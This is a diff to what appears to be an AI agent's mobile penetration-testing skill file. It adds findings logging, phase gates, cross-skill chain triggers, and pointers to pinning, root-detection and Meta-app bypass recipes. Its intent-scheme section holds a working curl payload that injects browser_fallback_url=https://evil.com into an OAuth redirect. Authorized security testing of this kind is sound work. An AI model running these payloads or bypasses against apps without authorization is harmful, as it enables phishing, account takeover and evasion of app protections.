@@ -70,6 +70,10 @@ When entering a phase, load the corresponding reference file:
 
 **Load only the active phase file(s).** Each contains: gate, steps, commands, references.
 
+**Cross-skill references:**
+- Attack recipes (mobile-specific): load ptest `references/attack-recipes.md` — includes deeplink hijacking, exported component abuse, cert pinning bypass patterns
+- Severity escalation: load ptest `references/severity-escalation.md` after every finding
+
 ---
 
 ## Framework Rules
@@ -113,6 +117,35 @@ notes: ""
 1. Read `findings_count` from `state.yaml`
 2. Increment by 1 → `MTEST-{count:03d}`
 3. Write updated count back immediately
+4. **Append to `findings.jsonl`** for cross-skill chaining:
+```python
+import json
+from datetime import datetime
+finding = {
+    "id": "MTEST-{count:03d}",
+    "skill": "mtest",
+    "severity": "{severity}",
+    "type": "{vuln_type}",  # e.g., ssl_bypass, deeplink_hijack, insecure_storage, webview_rce
+    "target": "{package_id} / {endpoint_if_applicable}",
+    "summary": "{one-line description}",
+    "chain_potential": [],  # Fill if applicable: ["atest:api_testing", "ptest:ssrf", "ctest:credential_access"]
+    "timestamp": datetime.now().isoformat(),
+    "phase": "{current_phase}",
+    "status": "confirmed"
+}
+with open("./mtest-output/findings.jsonl", "a") as f:
+    f.write(json.dumps(finding) + "\n")
+```
+
+**Cross-skill chain triggers from mtest findings:**
+| mtest Finding | Triggers | Action |
+|---------------|----------|--------|
+| API endpoint without cert pinning | atest | Full API security testing on that endpoint |
+| Hardcoded API key/secret in APK | ctest/ptest | Test key scope and access |
+| WebView loading arbitrary URLs | ptest | XSS/phishing on trusted app context |
+| Insecure deeplink handling | ptest | Open redirect / account takeover chain |
+| Backend URL discovered in strings | ptest | Add to attack surface |
+| OAuth token in local storage | atest | Token scope testing, replay attacks |
 
 ### Command Procedures
 
@@ -130,6 +163,22 @@ notes: ""
 3. Update `state.yaml`: mark current PASSED, unlock next, record timestamps
 
 **If gate NOT met:** list unmet criteria, suggest actions. Allow override with justification.
+
+### Gate Enforcement (MANDATORY before `next`)
+
+Before advancing any phase, run the gate checker:
+
+```python
+import sys, os
+sys.path.insert(0, os.path.expanduser("~/.hermes/skills/security/mtest/scripts"))
+from gate_check import check_gate, print_gate_status
+
+result = check_gate(".", phase=None)  # checks current phase from state.yaml
+print_gate_status(result)
+# Only advance if result["passed"] is True
+```
+
+If gate check fails, fix unmet items before advancing. Override only with explicit user justification.
 
 ### Resume (`resume`)
 
@@ -205,9 +254,11 @@ Critical/High findings MUST be validated dynamically in Phase 9 before final rep
 **Move-on rule:** Phase exceeds time cap with no findings → advance. Exception: Phase 7 can extend if actively finding bugs.
 
 **Adjustments:**
-- Bug bounty: compress P1/4/5/10, expand P7
-- Banking app: expand P3 (bypass) + P8 (attestation APIs)
+- Bug bounty: compress P1/4/5/10, expand P7. Phase jumping allowed (see below).
+- Banking app: expand P3 (bypass) + P8 (attestation APIs). For apps with Eversafe + Flutter BoringSSL (no known pattern), P3 cap = 3-4hr: root bypass 30min, Flutter SSL RE 2hr, anti-tampering 1hr. If not resolved in 4hr → accept partial bypass (HTTP Toolkit for interception, 53s Frida window for hooks) and advance.
 - Offline app: skip P4/P8, expand P6
+
+**Bug bounty phase jumping:** When a high-value lead is found during any phase (e.g., promising deep link in Phase 2), validate immediately — don't wait for sequential gate progression. Track the finding under the phase where it was proven (e.g., Phase 9 for PoC). Resume sequential flow after the lead is resolved. Update `state.yaml` to reflect the highest phase touched and mark intermediate phases as needed.
 
 ---
 
@@ -232,7 +283,43 @@ Critical/High findings MUST be validated dynamically in Phase 9 before final rep
 
 Load full decision tree: `references/app-type-decision-tree.md`
 
-**Quick:** Banking (heavy bypass + IDOR) | Social (deep links + WebView + API) | Utility (local storage + IPC) | Game/Unity (metadata + native RE) | Flutter (libapp.so strings + BoringSSL bypass)
+**Quick:** Banking (heavy bypass + IDOR) | Social (deep links + WebView + API) | Utility (local storage + IPC) | Game/Unity (metadata + native RE) | Flutter (libapp.so strings + BoringSSL bypass) | **TWA/WebView wrapper** (config extraction + intent filters, see below) | Meta apps (multi-layer pinning + server-side sig validation, see `references/meta-instagram-bypass.md`) | Meta/Instagram (patched APK + QUIC block + TrustManager hook, see `references/meta-instagram-bypass.md`)
+
+### TWA / WebView Wrapper Apps
+
+**Detection (Phase 2):** App has `LauncherActivity` extending `TwaLauncherActivity` or uses Chrome Custom Tabs to launch a URL. Minimal Java/Kotlin — no custom HTTP client, no native libs, no crypto. The APK is just a shell around a web app.
+
+**Pivot strategy — skip native RE, focus on:**
+1. **Config extraction**: Firebase keys, analytics tokens (Adjust, Braze), OAuth client IDs from `Application.java`, `google-services.json`, `strings.xml`, `resources.arsc`
+2. **Intent filter analysis**: Deep links, scheme handlers, `assetlinks.json` → test for intent scheme injection
+3. **Launch parameters**: TWA query params (`?twa=1`), custom headers injected by the wrapper
+4. **SDK tokens**: Embedded third-party tokens (Adjust app_token, Sentry DSN, Datadog client token) → test for write injection
+5. **Web attack surface**: The real app is the web origin — pivot to `ptest` for full web testing
+
+**What NOT to waste time on:** Frida hooking (nothing to hook), root detection bypass (irrelevant), native lib RE (none exist), certificate pinning (uses system Chrome).
+
+### Intent Scheme URL Injection
+
+**When:** Backend returns `Location: intent://...` with user-controlled data in the URL (common in OAuth callback endpoints like `/v1/auth/apple`, `/v1/auth/google`).
+
+**Detection:** POST to OAuth endpoint → check if Location header contains `intent://callback?{YOUR_BODY}#Intent;...;end`.
+
+**Exploitation — fragment boundary injection:**
+```bash
+# If POST body is reflected before the server's #Intent; fragment:
+curl -X POST "https://api.target.com/v1/auth/apple" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-binary 'code=x#Intent;package=com.nonexistent;S.browser_fallback_url=https://evil.com;end//'
+# Result: intent://callback?code=x#Intent;...;S.browser_fallback_url=https://evil.com;end//#Intent;package=real.app;...;end
+# Android parses FIRST #Intent; block → attacker controls:
+#   - browser_fallback_url (open redirect if app not installed)
+#   - package (redirect to different app)
+#   - action (override intent action)
+```
+
+**Impact:** Open redirect on Android (via fallback URL), phishing, session fixation. If victim doesn't have the app installed, browser navigates to attacker's URL.
+
+**Key:** Use raw `#` (not `%23`) to inject — URL-encoded `%23` stays in query string, raw `#` splits the fragment.
 
 ---
 
@@ -272,34 +359,38 @@ Load: `references/bug-bounty-fast-path.md`
 
 ---
 
+
 ## Pitfalls
 
-### Mobile-Specific
-- **`allowBackup=true` is Info, not Medium** — Android 12+ encrypts backups by default. Only escalate if sensitive data in plaintext SharedPreferences AND targetSdk < 31.
-- **WebView `loadUrl()` ≠ XSS** — unless `setJavaScriptEnabled(true)` AND user-controlled URL/content reaches it. Check both conditions before reporting.
-- **Root/jailbreak detection bypass is NOT a finding** — it's a means to test. Phase 3 is a tool, not a result. Only report if bypass enables a real attack chain.
-- **Frida on KernelSU 0.7.1 (kernel 4.4)** — too old for Zygisk/Shamiko. Use hluda-server at `/data/local/tmp/`, not regular frida-server. Spawn mode (`-f`) more reliable than attach.
-- **Certificate pinning bypass alone is Medium at best** — only escalates if you can demonstrate real API abuse (IDOR, auth bypass) through the unpinned traffic.
-- **`exported=true` on activities ≠ vulnerability** — only if the activity handles sensitive data without re-authentication or accepts untrusted input that leads to harm.
-- **Don't report debug/test code in release builds as High** — unless it's actually reachable (check if BuildConfig.DEBUG gates it). Unreachable dead code is Info.
+See `references/pitfalls.md` for full pitfalls (mobile-specific, Frida, Flutter, Meta apps, Eversafe, Ghidra). Key ones:
 
-### Workflow
-- **NEVER sync FROM randscript/myherms TO Hermes skills without explicit user confirmation.** Hermes is source of truth.
-- **Scripts from delegate_task subagents are not recoverable from state.db** — rebuild from scratch if lost.
-- **Before bulk file operations, verify backup exists.**
+- Root/jailbreak bypass is NOT a finding — Phase 3 is a means, not a result
+- Certificate pinning bypass alone is Medium at best — needs real API abuse to escalate
+- Check `overridePins="true"` in NSC before spending hours on Frida bypass
+- Flutter 3.22+ breaks ALL known SSL bypass patterns — needs Ghidra RE approach
+- Eversafe TLV token is forgeable (no crypto) — full API testing without real device
+- Don't over-engineer Frida when you have keys — write standalone Python instead
+- QUIC (UDP 443) bypasses HTTP proxies — block with iptables to force TCP fallback
 
 ## Cross-Skill Triggers
 
 | Signal | Trigger |
-|--------|---------|
+|--------|---------|\n| Eversafe/Everspin detected (kr.co.everspin) | `references/eversafe-frida-bypass.md` + `references/eversafe-attestation.md` (token forgery) |\n| macOS Burp + DNAT not working | `references/redsocks-transparent-proxy.md` |
+| Flutter SSL bypass hooks never trigger | `references/phase3-bypass.md` → fallback approaches |
+| BROWSABLE deep link with create/compose host | `scripts/deeplink_browsable_chain_test.sh` |
 | API endpoints in traffic | `atest` |
+| Flask passive analyzer needed | `references/passive-traffic-analyzer.md` |
 | Cloud storage URLs (S3/GCS) | `ctest` |
 | Web endpoints found | `ptest` |
 | Hardcoded secrets/source code | `scode` |
 | Web3/smart contract SDK | `w3hunt` |
 | API geo-blocked | ptest `references/geo-restriction-bypass.md` |
 | Large app (50K+ classes) | delegate Phase 2 to subagent |
+| Meta/Instagram/Facebook app | `references/meta-instagram-bypass.md` |
+| Meta/Instagram/Facebook app | load `references/meta-instagram-testing.md` |
+| Meta Threads (barcelona) app | load `references/meta-instagram-testing.md` → "Threads Specifics" |
 
 ## Operational Notes
 
 > Full notes: `references/operational-notes.md`
+
